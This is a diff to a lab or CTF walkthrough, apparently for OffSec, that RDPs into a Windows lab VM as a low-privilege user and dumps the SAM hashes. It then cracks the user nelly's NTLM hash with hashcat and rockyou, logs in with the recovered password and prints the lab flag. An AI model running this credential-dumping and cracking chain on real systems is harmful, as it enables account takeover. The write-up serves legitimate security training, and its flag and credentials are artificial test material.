@@ -140,7 +140,7 @@ RDP Connection as nelly
 Lab 1 - Follow the steps outlined in this section and find the flag on the nelly user's desktop on VM #1 (MARKETINGWK01).
 >``` shell
 ># 1) RDP into the target as the provided low-priv user (initial foothold)
->xfreerdp3 /u:offsec /p:lab /v:192.168.241.210 /cert:ignore
+>kali@kali:~$ xfreerdp3 /u:offsec /p:lab /v:192.168.241.210 /cert:ignore
 >
 ># 2) (On the Windows target) Run PowerShell "As Administrator" to allow credential dumping
 >
@@ -166,23 +166,31 @@ Lab 1 - Follow the steps outlined in this section and find the flag on the nelly
 >lsadump::sam
 >
 ># 10) (Back on Kali) Save nelly's NTLM hash to a file for offline cracking
->cat > nelly.hash << EOF
+>kali@kali:~$ cat > nelly.hash << EOF
 >3ae8e5f0ffabb3a627672e1600f1ba10
 >EOF
 >
 ># 11) Confirm the correct hashcat mode for NTLM (should show "1000 | NTLM")
->hashcat --help | grep -i ntlm
+>kali@kali:~$ hashcat --help | grep -i ntlm
 >
 ># 12) Crack the NTLM hash offline using rockyou + common mutation rules (best64)
->hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
+>kali@kali:~$ hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt \
 >-r /usr/share/hashcat/rules/best64.rule
 >
 ># 13) Display the cracked password from hashcat's potfile (shows hash:plaintext)
->hashcat -m 1000 nelly.hash --show
+>kali@kali:~$ hashcat -m 1000 nelly.hash --show
 >
->xfreerdp3 /u:nelly /p:nicole1 /v:192.168.241.210 /cert:ignore
+># 14) RDP into the target system as nelly using the cracked NTLM password
+>kali@kali:~$ xfreerdp3 /u:nelly /p:nicole1 /v:192.168.241.210 /cert:ignore
 >
-># Open flag.txt file located on the desktop
+># 15) Navigate to nelly's Desktop where the flag is stored
+>cd C:\Users\nelly\Desktop
+>
+># 16) List files on the Desktop to identify the flag
+>ls
+>
+># 17) Display the contents of the flag file to complete the lab
+>type flag.txt
 >
 >```
 >OS{251d3e79de2a2f9ad4cb9551f18b6f81}
